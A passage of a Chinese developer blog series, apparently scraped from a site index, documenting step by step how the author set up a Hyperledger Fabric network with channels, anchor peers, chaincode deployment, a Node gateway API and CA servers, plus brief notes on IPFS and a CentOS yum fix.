在test-network的network.sh脚本中仔细观察docker-compose的代码发现，test-network中使用了多个yml文件进行配置 123456789101112131415161718192021function networkUp() { checkPrereqs ## generate artifacts if they don't exist if [ ! -d &quot;organizations/peerOrganizations&quot; ]; then createOrgs fi COMPOSE_FILES=&quot;-f compose/${COMPOSE_FILE_BASE} -f compose/${CONTAINER_CLI}/${CONTAINER_CLI}-${COMPOSE_FILE_BASE}&quot; #此处 if [ &quot;${DATABASE}&quot; == &quot;couchdb&quot; ]; then COMPOSE_FILES=&quot;${COMPOSE_FILES} -f compose/${COMPOSE_FILE_COUCH} -f compose/${CONTAINER_CLI}/${CONTAINER_CLI}-${COMPOSE_FILE_COUCH}&quot; fi DOCKER_SOCK=&quot;${DOCKER_SOCK}&quot; ${CONTAINER_CLI_COMPOSE} ${COMPOSE_FILES} up -d 2&gt;&amp;1 $CONTAINER_CLI ps -a if [ $? -ne 0 ]; then fatalln &quot;Unable to start network&quot; fi} 故找到相应文件，将其中的配置添加到节点中（这也就是之前peer节点创建后启动失败的原因） 123456789101112131415161718192021222324252627282930313233version: '3.7'services: peer0.org1.fedfab.com: container_name: peer0.org1.fedfab.com image: hyperledger/fabric-peer:latest labels: service: hyperledger-fabric environment: #Generic peer variables - CORE_VM_ENDPOINT=unix:///host/var/run/docker.sock - CORE_VM_DOCKER_HOSTCONFIG_NETWORKMODE=fabric_test volumes: - ./docker/peercfg:/etc/hyperledger/peercfg - ${DOCKER_SOCK}:/host/var/run/docker.sock peer0.org2.fedfab.com: container_name: peer0.org2.fedfab.com image: hyperledger/fabric-peer:latest labels: service: hyperledger-fabric environment: #Generic peer variables - CORE_VM_ENDPOINT=unix:///host/var/run/docker.sock - CORE_VM_DOCKER_HOSTCONFIG_NETWORKMODE=fabric_test volumes: - ./docker/peercfg:/etc/hyperledger/peercfg - ${DOCKER_SOCK}:/host/var/run/docker.sock cli: container_name: cli image: hyperledger/fabric-tools:latest volumes: - ./docker/peercfg:/etc/hyperledger/peercfg 使用docer-compose命令创建容器(添加DOCKER_SOCK)环境变量123SOCK=&quot;${DOCKER_HOST:-/var/run/docker.sock}&quot;export DOCKER_SOCK=&quot;${SOCK##unix://}&quot;docker-compose up -d docker容器建立了，但是docker-compose的配置文件中的很多细节并不清楚 修改host文件12345678sudo tee -a /etc/hosts &lt;&lt;-'EOF'127.0.0.1 orderer.fedfab.com127.0.0.1 peer0.org1.fedfab.com127.0.0.1 peer1.org1.fedfab.com127.0.0.1 peer2.org1.fedfab.com127.0.0.1 peer0.org2.fedfab.comEOFcat /etc/hosts 安装链码 参考 Housekeeping初始化mod，获取fabric模块 12go mod init github.com/hyperledger/fabric-samples/chaincode/mycontractgo get -u github.com/hyperledger/fabric-contract-api-go 编写链码，编译编写好chaincode.go，下载依赖包，编译 12go mod vendorgo build 配置通道 peer命令介绍 进入cli容器1234docker exec -it cli0 shdocker exec -it cli1 shdocker exec -it cli2 shdocker exec -it cli3 sh 安装通道1peer channel create -o orderer.fedfab.com:7050 -c channel2 -f ./channel-artifacts/channel2.tx --tls true --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/fedfab.com/msp/tlscacerts/tlsca.fedfab.com-cert.pem 12345678910111213142022-08-29 08:31:23.202 UTC 0001 INFO [channelCmd] InitCmdFactory -&gt; Endorser and orderer connections initialized2022-08-29 08:31:23.211 UTC 0002 INFO [cli.common] readBlock -&gt; Expect block, but got status: &amp;{NOT_FOUND}2022-08-29 08:31:23.214 UTC 0003 INFO [channelCmd] InitCmdFactory -&gt; Endorser and orderer connections initialized2022-08-29 08:31:23.415 UTC 0004 INFO [cli.common] readBlock -&gt; Expect block, but got status: &amp;{SERVICE_UNAVAILABLE}2022-08-29 08:31:23.417 UTC 0005 INFO [channelCmd] InitCmdFactory -&gt; Endorser and orderer connections initialized2022-08-29 08:31:23.619 UTC 0006 INFO [cli.common] readBlock -&gt; Expect block, but got status: &amp;{SERVICE_UNAVAILABLE}2022-08-29 08:31:23.621 UTC 0007 INFO [channelCmd] InitCmdFactory -&gt; Endorser and orderer connections initialized2022-08-29 08:31:23.822 UTC 0008 INFO [cli.common] readBlock -&gt; Expect block, but got status: &amp;{SERVICE_UNAVAILABLE}2022-08-29 08:31:23.824 UTC 0009 INFO [channelCmd] InitCmdFactory -&gt; Endorser and orderer connections initialized2022-08-29 08:31:24.026 UTC 000a INFO [cli.common] readBlock -&gt; Expect block, but got status: &amp;{SERVICE_UNAVAILABLE}2022-08-29 08:31:24.028 UTC 000b INFO [channelCmd] InitCmdFactory -&gt; Endorser and orderer connections initialized2022-08-29 08:31:24.229 UTC 000c INFO [cli.common] readBlock -&gt; Expect block, but got status: &amp;{SERVICE_UNAVAILABLE}2022-08-29 08:31:24.231 UTC 000d INFO [channelCmd] InitCmdFactory -&gt; Endorser and orderer connections initialized2022-08-29 08:31:24.434 UTC 000e INFO [cli.common] readBlock -&gt; Received block: 0 将生成的channel2.block复制到其他cli中1234docker cp cli0:/opt/gopath/src/github.com/hyperledger/fabric/peer/channel2.block ./docker cp ./channel2.block cli1:/opt/gopath/src/github.com/hyperledger/fabric/peer/channel2.blockdocker cp ./channel2.block cli2:/opt/gopath/src/github.com/hyperledger/fabric/peer/channel2.blockdocker cp ./channel2.block cli3:/opt/gopath/src/github.com/hyperledger/fabric/peer/channel2.block 加入channel分别进入四个cli，执行以下命令 1peer channel join -b ./channel2.block 122022-08-29 08:55:24.659 UTC 0001 INFO [channelCmd] InitCmdFactory -&gt; Endorser and orderer connections initialized2022-08-29 08:55:24.695 UTC 0002 INFO [channelCmd] executeJoin -&gt; Successfully submitted proposal to join channel 第一次执行时，cli0-cli2出现了connection refuse的情况，对docker compose文件进行修改，重新进行端口映射，则正常。这里出现这个问题的原因不详，容器内的端口号必须和外面匹配才行 编号 端口配置 orderer.fedfab.com 7050:7050, 7053:7053, 9443:9443 peer0.org1.fedfab.com 8051:8051, 9444:9444 peer1.org1.fedfab.com 8053:8053, 9445:9444 peer2.org1.fedfab.com 8055:8055, 9446:9444 peer0.org2.fedfab.com 9051:7051, 9447:9444 验证是否加入通道1peer channel getinfo -c channel2 122022-08-29 09:28:21.265 UTC 0001 INFO [channelCmd] InitCmdFactory -&gt; Endorser and orderer connections initializedBlockchain info: {&quot;height&quot;:1,&quot;currentBlockHash&quot;:&quot;xHaVldOzr0XQgw20tyMdri5No9dZuSQMez7jUOew/TU=&quot;} 配置锚节点 获取通道配置12peer channel fetch config channel-artifacts/config_block.pb -o orderer.fedfab.com:7050 -c channel2 --tls --cafile ${PWD}/crypto/ordererOrganizations/fedfab.com/orderers/orderer.fedfab.com/msp/tlscacerts/tlsca.fedfab.com-cert.pemcd channel-artifacts pb文件转为json文件123configtxlator proto_decode --input config_block.pb --type common.Block --output config_block.jsonjq .data.data[0].payload.data.config config_block.json &gt; config.jsoncp config.json config_copy.json 使用jq工具将Org1的Peer锚节点添加到通道配置中 1jq '.channel_group.groups.Application.groups.Org2MSP.values += {&quot;AnchorPeers&quot;:{&quot;mod_policy&quot;: &quot;Admins&quot;,&quot;value&quot;:{&quot;anchor_peers&quot;: [{&quot;host&quot;: &quot;peer0.org2.fedfab.com&quot;,&quot;port&quot;: 9051}]},&quot;version&quot;: &quot;0&quot;}}' config_copy.json &gt; modified_config.json 完成此步骤后，我们在modified_config.json文件中以JSON格式获取了通道配置的更新版本。现在，我们可以将原始和修改的通道配置都转换回protobuf格式，并计算它们之间的差异。 123configtxlator proto_encode --input config.json --type common.Config --output config.pbconfigtxlator proto_encode --input modified_config.json --type common.Config --output modified_config.pbconfigtxlator compute_update --channel_id channel2 --original config.pb --updated modified_config.pb --output config_update.pb 名为channel_update.pb的新的protobuf包含我们需要应用于通道配置的Peer锚节点更新。我们可以将配置更新包装在交易Envelope中，以创建通道配置更新交易。 123configtxlator proto_decode --input config_update.pb --type common.ConfigUpdate --output config_update.jsonecho '{&quot;payload&quot;:{&quot;header&quot;:{&quot;channel_header&quot;:{&quot;channel_id&quot;:&quot;channel2&quot;, &quot;type&quot;:2}},&quot;data&quot;:{&quot;config_update&quot;:'$(cat config_update.json)'}}}' | jq . &gt; config_update_in_envelope.jsonconfigtxlator proto_encode --input config_update_in_envelope.json --type common.Envelope --output config_update_in_envelope.pb 我们可以通过向peer channel update命令提供新的通道配置来添加Peer锚节点。因为我们正在更新仅影响Org1的部分通道配置，所以其他通道成员不需要批准通道更新。 12cd ..peer channel update -f channel-artifacts/config_update_in_envelope.pb -c channel2 -o orderer.fedfab.com:7050 --tls --cafile ${PWD}/crypto/ordererOrganizations/fedfab.com/orderers/orderer.fedfab.com/msp/tlscacerts/tlsca.fedfab.com-cert.pem 122022-08-29 09:47:17.178 UTC 0001 INFO [channelCmd] InitCmdFactory -&gt; Endorser and orderer connections initialized2022-08-29 09:47:17.185 UTC 0002 INFO [channelCmd] update -&gt; Successfully submitted channel update 进入org2的cli，执行上面的类似操作 验证已经更新 1peer channel getinfo -c channel2 1Blockchain info: {&quot;height&quot;:3,&quot;currentBlockHash&quot;:&quot;ScjYWX32DW8yvtDZ+DnLOljrFnHIjlCT2WbM2s19lF0=&quot;,&quot;previousBlockHash&quot;:&quot;hTNOb9vIRm2sm8XPgrEsz33w/Ivc28MINV4Kn6ICXyU=&quot;} 已经有三个块了","link":"/home/2022/10/22/fedfab/fabric/2.fabric%E8%87%AA%E5%AE%9A%E4%B9%89%E4%B8%8E%E5%AE%9E%E8%B7%B5/"},{"title":"fabric-3.链码运行与Api调用","text":"中国社区文档 链码的打包 之前已经完成了链码mod的初始化和编译，直接进行打包1234peer lifecycle chaincode package fedfab.tar.gz \\ --path ../../fabric-cluster/chaincode/go/fedfab \\ --label fedfab_1 \\ --lang golang 在当前目录生成了fedfab.tar.gz文件 将打包好的文件复制到其他cli中1234docker cp cli0:/opt/gopath/src/github.com/hyperledger/fabric/peer/fedfab.tar.gz ./docker cp ./fedfab.tar.gz cli1:/opt/gopath/src/github.com/hyperledger/fabric/peer/docker cp ./fedfab.tar.gz cli2:/opt/gopath/src/github.com/hyperledger/fabric/peer/docker cp ./fedfab.tar.gz cli3:/opt/gopath/src/github.com/hyperledger/fabric/peer/ 链码安装 在每个cli上对链码进行安装1peer lifecycle chaincode install fedfab.tar.gz 122022-09-28 11:00:07.102 UTC 0001 INFO [cli.lifecycle.chaincode] submitInstallProposal -&gt; Installed remotely: response:&lt;status:200 payload:&quot;\\nIfedfab_1:705f9bef5195eff92ab7dd43ad1bcc2a7cb35defbb5c984b5197081f5b768d2e\\022\\010fedfab_1&quot; &gt; 2022-09-28 11:00:07.102 UTC 0002 INFO [cli.lifecycle.chaincode] submitInstallProposal -&gt; Chaincode code package identifier: fedfab_1:705f9bef5195eff92ab7dd43ad1bcc2a7cb35defbb5c984b5197081f5b768d2e 组织org批准链码1peer lifecycle chaincode approveformyorg --channelID channel2 --name fedfab --version 1.0 --package-id fedfab_1:705f9bef5195eff92ab7dd43ad1bcc2a7cb35defbb5c984b5197081f5b768d2e --sequence 1 --init-required --tls true --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/fedfab.com/orderers/orderer.fedfab.com/msp/tlscacerts/tlsca.fedfab.com-cert.pem org1输出122022-09-03 11:12:26.988 UTC 0001 INFO [cli.lifecycle.chaincode] setOrdererClient -&gt; Retrieved channel (channel2) orderer endpoint: orderer.fedfab.com:70512022-09-03 11:12:29.067 UTC 0002 INFO [chaincodeCmd] ClientWait -&gt; txid [fcf3b9e351cae89503b256ce5dde76080432eac3b065ad8108be9ce8fbe2443a] committed with status (VALID) at peer0.org1.fedfab.com:8051 org2输出122022-09-03 11:12:29.057 UTC 0001 INFO [cli.lifecycle.chaincode] setOrdererClient -&gt; Retrieved channel (channel2) orderer endpoint: orderer.fedfab.com:70512022-09-03 11:12:31.110 UTC 0002 INFO [chaincodeCmd] ClientWait -&gt; txid [24e460abf242c2fd86b0a56e6ee045c76c08cd9b77d2bccb66bcd4e315806deb] committed with status (VALID) at peer0.org2.fedfab.com:9051 每个org提交一次即可 验证是否批准成功1peer lifecycle chaincode queryapproved --channelID channel2 --name fedfab --sequence 1 --tls true --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/fedfab.com/orderers/orderer.fedfab.com/msp/tlscacerts/tlsca.fedfab.com-cert.pem --output json 12345678910111213141516{ &quot;sequence&quot;: 1, &quot;version&quot;: &quot;1.0&quot;, &quot;endorsement_plugin&quot;: &quot;escc&quot;, &quot;validation_plugin&quot;: &quot;vscc&quot;, &quot;validation_parameter&quot;: &quot;EiAvQ2hhbm5lbC9BcHBsaWNhdGlvbi9FbmRvcnNlbWVudA==&quot;, &quot;collections&quot;: {}, &quot;init_required&quot;: true, &quot;source&quot;: { &quot;Type&quot;: { &quot;LocalPackage&quot;: { &quot;package_id&quot;: &quot;09dc77ee99925c9ffd623cdcf6009c125c25bfec709a0986a62a883ef28d1ae4&quot; } } }} 1peer lifecycle chaincode checkcommitreadiness --channelID channel2 --name fedfab --version 1.0 --init-required --sequence 1 --tls true --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/fedfab.com/orderers/orderer.fedfab.com/msp/tlscacerts/tlsca.fedfab.com-cert.pem --output json 123456{ &quot;approvals&quot;: { &quot;Org1MSP&quot;: true, &quot;Org2MSP&quot;: true }} 提交123456peer lifecycle chaincode commit -o orderer.fedfab.com:7050 --channelID channel2 --name fedfab --version 1.0 --sequence 1 --tls true --init-required --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/fedfab.com/orderers/orderer.fedfab.com/msp/tlscacerts/tlsca.fedfab.com-cert.pem \\ --peerAddresses peer0.org1.fedfab.com:8051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer0.org1.fedfab.com/tls/ca.crt \\ --peerAddresses peer1.org1.fedfab.com:8053 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer1.org1.fedfab.com/tls/ca.crt \\ --peerAddresses peer2.org1.fedfab.com:8055 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer2.org1.fedfab.com/tls/ca.crt \\ --peerAddresses peer0.org2.fedfab.com:9051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org2.fedfab.com/peers/peer0.org2.fedfab.com/tls/ca.crt 12342022-09-03 22:04:17.335 UTC 0001 INFO [chaincodeCmd] ClientWait -&gt; txid [2468ffb8850ef91b0e3643cdc347fead1e9c39e8c0de8e5528b687b06d4e8ddb] committed with status (VALID) at peer1.org1.fedfab.com:80532022-09-03 22:04:17.338 UTC 0002 INFO [chaincodeCmd] ClientWait -&gt; txid [2468ffb8850ef91b0e3643cdc347fead1e9c39e8c0de8e5528b687b06d4e8ddb] committed with status (VALID) at peer2.org1.fedfab.com:80552022-09-03 22:04:17.338 UTC 0003 INFO [chaincodeCmd] ClientWait -&gt; txid [2468ffb8850ef91b0e3643cdc347fead1e9c39e8c0de8e5528b687b06d4e8ddb] committed with status (VALID) at peer0.org1.fedfab.com:80512022-09-03 22:04:17.338 UTC 0004 INFO [chaincodeCmd] ClientWait -&gt; txid [2468ffb8850ef91b0e3643cdc347fead1e9c39e8c0de8e5528b687b06d4e8ddb] committed with status (VALID) at peer0.org2.fedfab.com:9051 链码的调用输入一个键值对a:bb1234567peer chaincode invoke -o orderer.fedfab.com:7050 --isInit --ordererTLSHostnameOverride orderer.fedfab.com --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/fedfab.com/orderers/orderer.fedfab.com/msp/tlscacerts/tlsca.fedfab.com-cert.pem --channelID channel2 --name fedfab --tls true \\ --peerAddresses peer0.org1.fedfab.com:8051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer0.org1.fedfab.com/tls/ca.crt \\ --peerAddresses peer1.org1.fedfab.com:8053 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer1.org1.fedfab.com/tls/ca.crt \\ --peerAddresses peer2.org1.fedfab.com:8055 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer2.org1.fedfab.com/tls/ca.crt \\ --peerAddresses peer0.org2.fedfab.com:9051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org2.fedfab.com/peers/peer0.org2.fedfab.com/tls/ca.crt \\ -c '{&quot;Args&quot;:[&quot;a&quot;, &quot;bb&quot;]}' 12022-09-03 22:32:26.926 UTC 0001 INFO [chaincodeCmd] chaincodeInvokeOrQuery -&gt; Chaincode invoke successful. result: status:200 这个地方出错失败了很多次，原因是之前approve chaincode时，指定的package-id不正确，在approve的前一步install的输出中，输出的package-id是： Chaincode code package identifier: fedfab_2:cf7c1115e177f200ee6383d455b563e1df20721e0dccb6bb9cbf43e95d008739 chaincode的package-id是lable:一串数字，在approve时指定pkgid时必须完整，不能只指定后面的一串数字，重新在org中进行approve操作，则可以正确执行链码 这个回答的reference是官网的文档deploy_chaincode中的内容 查询a的值1peer chaincode query -C channel2 -n fedfab -c '{&quot;Args&quot;:[&quot;query&quot;, &quot;a&quot;]}' 1bb 修改a的值为cc，并查询验证1234567peer chaincode invoke -o orderer.fedfab.com:7050 --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/fedfab.com/orderers/orderer.fedfab.com/msp/tlscacerts/tlsca.fedfab.com-cert.pem --channelID channel2 --name fedfab --tls true \\ --peerAddresses peer0.org1.fedfab.com:8051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer0.org1.fedfab.com/tls/ca.crt \\ --peerAddresses peer1.org1.fedfab.com:8053 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer1.org1.fedfab.com/tls/ca.crt \\ --peerAddresses peer2.org1.fedfab.com:8055 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer2.org1.fedfab.com/tls/ca.crt \\ --peerAddresses peer0.org2.fedfab.com:9051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org2.fedfab.com/peers/peer0.org2.fedfab.com/tls/ca.crt \\ -c '{&quot;Args&quot;:[&quot;set&quot;, &quot;a&quot;, &quot;cc&quot;]}'peer chaincode query -C channel2 -n fedfab -c '{&quot;Args&quot;:[&quot;query&quot;, &quot;a&quot;]}' 122022-09-04 07:48:30.012 UTC 0001 INFO [chaincodeCmd] chaincodeInvokeOrQuery -&gt; Chaincode invoke successful. result: status:200 payload:&quot;cc&quot; cc 之前失败了几次，试图重新搭建网络，但是即使所有容器都删除后，网络似乎还有一定的“记忆”。并且不能使用新生成的证书文件（否则会报错），只能使用第一次生成的证书文件。(已解决) docker network 在编写docker compose文件时，会配置一个network，起初认为这是定义fabric网络特有的，后来发现是docker的功能。 参考资料 容器网络模型（Container Network Model，简称CNM），只要符合这个模型的网络接口就能被用于容器之间通信，而通信的过程和细节可以完全由网络接口来实现。 参考中详细讲解了docker compose 中使用networks定义网络 fedml与fabric交互 编写application，为了让fabric与fedml结合，需要有调用fabric的api，在fabric训练的不同阶段调用fabric的api达到交互的目的。但是fedml是python代码，api提供了js和java，调用起来相对麻烦一些 使用与hyperledger fabric同名的一个python库fabric，远程连接cli的docker执行命令，感觉这样安全性较差 直接使用python sdk fabric的jira python sdk sdk文档 sdk的pypi链接 通过pypi查询，它最后一次更新在2020年8月，主要支持fabric 1.4.x版本 使用node 使用node编写js代码，如实现invoke等功能，再为每个功能指定一个端口，使用node为每个功能建立http服务。在fedml训练过程中，按照需要调用这些接口，即可以实现上述功能 node实现get、post请求的教程 node sdk 简介 参考 此 API 目前不提供管理功能，例如安装和启动智能合约。对于特定的高级用法，可以使用较低级别的fabric-common API。 用于与 Hyperledger Fabric 区块链网络交互的入口点是 Gateway类。一旦实例化，这个长期存在的对象提供了与区块链网络中的对等点的可重用连接，并允许访问该对等点所属的任何区块链 网络（通道）。提供了对该区块链网络中运行的智能合约（链码）的访问，并且可以向其 提交交易或 评估查询。 fabric-gateway简介参考 fabric gateway是fabric v2.4 引入的一项服务，它提供用于将事务提交到fabric网络的最简化的API 示例代码1234567891011121314151617181920212223242526272829303132333435import * as grpc from '@grpc/grpc-js';import * as crypto from 'crypto';import { connect, Identity, signers } from '@hyperledger/fabric-gateway';import { promises as fs } from 'fs';import { TextDecoder } from 'util';const utf8Decoder = new TextDecoder();async function main(): Promise&lt;void&gt; { const credentials = await fs.readFile('path/to/certificate.pem'); const identity: Identity = { mspId: 'myorg', credentials }; const privateKeyPem = await fs.readFile('path/to/privateKey.pem'); const privateKey = crypto.createPrivateKey(privateKeyPem); const signer = signers.newPrivateKeySigner(privateKey); const client = new grpc.Client('gateway.example.org:1337', grpc.credentials.createInsecure()); const gateway = connect({ identity, signer, client }); try { const network = gateway.getNetwork('channelName'); const contract = network.getContract('chaincodeName'); const putResult = await contract.submitTransaction('put', 'time', new Date().toISOString()); console.log('Put result:', utf8Decoder.decode(putResult)); const getResult = await contract.evaluateTransaction('get', 'time'); console.log('Get result:', utf8Decoder.decode(getResult)); } finally { gateway.close(); client.close() }}main().catch(console.error); 运行ts文件 参考 参考代码 安装依赖12npm install @hyperledger/fabric-gatewaynpm install @grpc/grpc-js 安装ts 12345678910tar -zxvf node-v16.17.0-linux-x64.tar.xzsudo mv node-v16.17.0-linux-x64 /usr/local/nodevim tee -a /etc/profile &lt;&lt;-'EOF'export NODE_HONE=/usr/local/nodeexport PATH=$PATH:$NODE_HONE/binEOFsource /etc/profilenpm install -g typescriptnpm install ts-node -Dtsc -v 运行ts文件 1npx ts-node src/app.ts 对a的get，set，get，再对b（原来没有的key） set，get12345678910111213141516171819202122232425/home/tt/Desktop/fabric/my-network/nodes/crypto-config/peerOrganizations/org1.fedfab.comchannelName: channel2chaincodeName: fedfabmspId: Org1MSPcryptoPath: /home/tt/Desktop/fabric/my-network/nodes/crypto-config/peerOrganizations/org1.fedfab.comkeyDirectoryPath: /home/tt/Desktop/fabric/my-network/nodes/crypto-config/peerOrganizations/org1.fedfab.com/users/User1@org1.fedfab.com/msp/keystorecertPath: /home/tt/Desktop/fabric/my-network/nodes/crypto-config/peerOrganizations/org1.fedfab.com/users/User1@org1.fedfab.com/msp/signcerts/User1@org1.fedfab.com-cert.pemtlsCertPath: /home/tt/Desktop/fabric/my-network/nodes/crypto-config/peerOrganizations/org1.fedfab.com/peers/peer0.org1.fedfab.com/tls/ca.crtpeerEndpoint: localhost:8051peerHostAlias: peer0.org1.fedfab.com--&gt; Evaluate Transaction: Invoke, function returns all the current assets on the ledger*** Result: bb--&gt; Evaluate Transaction: Invoke, function returns all the current assets on the ledger*** Result: dd--&gt; Evaluate Transaction: Invoke, function returns all the current assets on the ledger*** Result: dd--&gt; Evaluate Transaction: Invoke, function returns all the current assets on the ledger*** Result: cc--&gt; Evaluate Transaction: Invoke, function returns all the current assets on the ledger*** Result: cc 创建http服务使用node-http等库，建立http服务，就可以通过网络请求的方式访问区块链 123456789http://10.128.196.184:3000/invokeChaincodebody:json{ &quot;peer&quot;: 0, &quot;org&quot;: 2, &quot;function&quot;: &quot;set&quot;, &quot;key&quot;: &quot;a&quot;, &quot;val&quot;: &quot;bb&quot;} 12345678http://10.128.196.184:3000/invokeChaincodebody:json{ &quot;peer&quot;: 0, &quot;org&quot;: 2, &quot;function&quot;: &quot;get&quot;, &quot;key&quot;: &quot;a&quot;} 代码","link":"/home/2022/10/22/fedfab/fabric/3.%E9%93%BE%E7%A0%81%E8%BF%90%E8%A1%8C%E4%B8%8EApi%E8%B0%83%E7%94%A8/"},{"title":"fabric-4.创建ca","text":"官方教程创建ca节点 参考教程 第一次启动CA时，它查找fabric-ca-server-config.yaml文件，其中包含CA配置参数。 编写创建ca的docker-compose文件1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586version: '3.7'networks: fed_fab: name: fabric_fedmlservices: ca_org1: image: hyperledger/fabric-ca:latest labels: service: hyperledger-fabric environment: - FABRIC_CA_HOME=/etc/hyperledger/fabric-ca-server - FABRIC_CA_SERVER_CA_NAME=ca-org1 - FABRIC_CA_SERVER_TLS_ENABLED=true - FABRIC_CA_SERVER_PORT=8050 - FABRIC_CA_SERVER_OPERATIONS_LISTENADDRESS=0.0.0.0:18050 ports: - &quot;8050:8050&quot; - &quot;18050:18050&quot; command: sh -c 'fabric-ca-server start -b admin:adminpw -d' volumes: - ../crypto-config/fabric-ca/org1:/etc/hyperledger/fabric-ca-server container_name: ca_org1 networks: - fed_fab ca_org2: image: hyperledger/fabric-ca:latest labels: service: hyperledger-fabric environment: - FABRIC_CA_HOME=/etc/hyperledger/fabric-ca-server - FABRIC_CA_SERVER_CA_NAME=ca-org2 - FABRIC_CA_SERVER_TLS_ENABLED=true - FABRIC_CA_SERVER_PORT=9050 - FABRIC_CA_SERVER_OPERATIONS_LISTENADDRESS=0.0.0.0:19050 ports: - &quot;9050:9050&quot; - &quot;19050:19050&quot; command: sh -c 'fabric-ca-server start -b admin:adminpw -d' volumes: - ../crypto-config/fabric-ca/org2:/etc/hyperledger/fabric-ca-server container_name: ca_org2 networks: - fed_fab ca_orderer: image: hyperledger/fabric-ca:latest labels: service: hyperledger-fabric environment: - FABRIC_CA_HOME=/etc/hyperledger/fabric-ca-server - FABRIC_CA_SERVER_CA_NAME=ca-orderer - FABRIC_CA_SERVER_TLS_ENABLED=true - FABRIC_CA_SERVER_PORT=7051 - FABRIC_CA_SERVER_OPERATIONS_LISTENADDRESS=0.0.0.0:17051 ports: - &quot;7051:7051&quot; - &quot;17051:17051&quot; command: sh -c 'fabric-ca-server start -b admin:adminpw -d' volumes: - ../crypto-config/fabric-ca/ordererOrg:/etc/hyperledger/fabric-ca-server container_name: ca_orderer networks: - fed_fab ca_tls: image: hyperledger/fabric-ca:latest labels: service: hyperledger-fabric environment: - FABRIC_CA_HOME=/etc/hyperledger/fabric-ca-server - FABRIC_CA_SERVER_CA_NAME=ca-orderer - FABRIC_CA_SERVER_TLS_ENABLED=true - FABRIC_CA_SERVER_PORT=7054 - FABRIC_CA_SERVER_OPERATIONS_LISTENADDRESS=0.0.0.0:17054 ports: - &quot;7054:7054&quot; - &quot;17054:17054&quot; command: sh -c 'fabric-ca-server start -b admin:adminpw -d' volumes: - ../crypto-config/fabric-ca/tls-ca:/etc/hyperledger/fabric-ca-server container_name: ca_tls networks: - fed_fab 启动ca节点1docker-compose -f compose/compose-ca.yaml up -d 可以看到它生成了容器，并在../crypto-config文件夹下生成了各个节点的证书等文件 修改test-network中的registerEnroll.sh并执行1234. ./crypto-config/fabric-ca/registerEnroll.shcreateOrg1createOrg2createOrderer 其他步骤创建好ca后，就可以部署网络节点，chaincode，并使用api调用链码，参考test-network中的操作，将network删除干净，将生成网络和销毁网络整理成脚本/scripts/networkup.sh和/scripts/networkdown.sh","link":"/home/2022/10/22/fedfab/fabric/4.%E5%88%9B%E5%BB%BAca/"},{"title":"fabric-5.论文","text":"需要实现 论文中的新的归一化算法 防止恶意模型更新 客户使用私钥签名模型 fedml的节点作为mec服务器起训练作用，再对原始数据进行处理，模拟移动设备对数据添加噪声 智能合约中记录用户的有效交易，用于用户获取奖励 如何控制fabric的出块？ 实现IPFS peer节点和fedml训练节点之间如何获取对方的公钥，如何避免中间人攻击 笔记IPFS is a peer-to-peer distributed file system that enables distributed computing devices to connect with the same file system. 在IPFS上进行存储，区块链上存储Hash指针，用于找到文件（块大小限制） 在神经网络的中间层添加噪声(ε, δ)-differential，cnn全连接层作为噪声提取器 共识方案是基于股份证明（POS）和拜占庭式容错（BFT） leader是币占比最高的节点，出块需求committee节点超过2/3验证同意，committee节点广播块。 上传新模型的过程 矿工验证上载模型的有效性：矿工验证上传模型的签名，有效则将交易放入交易池。矿工组成的Committee 使用Multi-Krum验证池中的所有交易，并接受合法的更新。领导者生成包含新模型（模型hash/ifps地址）的新块。 leader更新模型 激励机制归一化方法","link":"/home/2022/10/22/fedfab/fabric/5.%E8%AE%BA%E6%96%87/"},{"title":"fabric-6.IPFS的安装与使用","text":"IPFS 安装下载地址安装教程ipfs搭建私有网络 Kubo CLIKubo RPC API","link":"/home/2022/10/22/fedfab/fabric/6.IPFS%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"},{"title":"fabric-7.使用nest后端框架","text":"教程","link":"/home/2022/10/22/fedfab/fabric/7.%E4%BD%BF%E7%94%A8nest%E5%90%8E%E7%AB%AF%E6%A1%86%E6%9E%B6/"},{"title":"fabric-8.yaml-requests","text":"Yaml-Requests 地址","link":"/home/2022/10/22/fedfab/fabric/8.yaml-requests/"},{"title":"fabric-9.服务器配置","text":"centos yum错误1错误：为 repo 'appstream' 下载元数据失败 : Cannot prepare internal mirrorlist: No URLs in mirrorlist 参考12sudo sed -i -e &quot;s|mirrorlist=|#mirrorlist=|g&quot; /etc/yum.repos.d/CentOS-*sudo sed -i -e &quot;s|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g&quot; /etc/yum.repos.d/CentOS-* 查看显卡1lspci | grep -i vga 